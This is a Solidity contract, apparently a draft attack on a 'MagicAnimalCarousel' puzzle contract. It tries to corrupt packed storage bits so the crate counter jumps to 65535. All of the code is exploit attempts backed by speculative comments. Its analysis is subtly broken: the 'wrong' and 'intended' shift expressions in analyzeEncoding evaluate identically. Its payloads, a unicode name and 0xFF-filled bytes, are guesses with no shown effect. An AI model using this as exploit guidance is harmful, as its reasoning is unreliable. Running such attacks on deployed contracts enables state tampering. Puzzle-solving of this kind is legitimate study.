// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function carousel(uint256 crateId) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
    function encodeAnimalName(string calldata animalName) external pure returns (uint256);
}

contract PreciseAttack {
    IMagicAnimalCarousel public target;
    
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
    }
    
    function analyzeEncoding(string memory animal) external view returns (uint256 encoded, uint256 shiftedWrong, uint256 shiftedCorrect) {
        encoded = target.encodeAnimalName(animal);
        shiftedWrong = encoded >> 16 << 176; // What actually happens
        shiftedCorrect = (encoded >> 16) << 160 + 16; // What was intended
    }
    
    function exploitOverflow() external {
        // The goal might be to make currentCrateId = MAX_CAPACITY (65535)
        // When nextCrateId = 65535, the next value would be (65535 + 1) % 65535 = 1
        // But if we can corrupt the state to jump directly there...
        
        // The XOR operation with the wrongly shifted animal data might help
        // Let's craft a specific animal name
        
        // We need currentCrateId to become 65535
        // In setAnimalAndSpin, currentCrateId = nextCrateId
        // nextCrateId comes from (carousel[currentCrateId] & NEXT_ID_MASK) >> 160
        
        // So we need to corrupt carousel[1] to have 65535 in bits 160-175
        
        // Using the maximum animal name to cause maximum disruption
        string memory animal = unicode"🦄🦄🦄"; // Unicode to pack more data
        target.setAnimalAndSpin(animal);
    }
    
    function directApproach() external {
        // Looking at the constructor: carousel[0] ^= 1 << 160
        // This sets the nextCrateId of crate 0 to 1
        
        // The winning condition might be reaching crate 65535
        // Let's try to directly jump there using the overflow
        
        // We need bits 160-175 to contain 65535 (0xFFFF)
        // With the wrong shift by 176, our data ends up higher
        
        // Let's create an animal name that when processed will
        // result in the right bit pattern
        
        bytes memory animalBytes = new bytes(12);
        // Fill with a pattern that might create the overflow we need
        animalBytes[0] = 0xFF;
        animalBytes[1] = 0xFF;
        
        target.setAnimalAndSpin(string(animalBytes));
    }
    
    function checkProgress() external view returns (uint256 currentId, uint256 crate0, uint256 crate1, uint256 crate65535) {
        currentId = target.currentCrateId();
        crate0 = target.carousel(0);
        crate1 = target.carousel(1);
        crate65535 = target.carousel(65535);
    }
}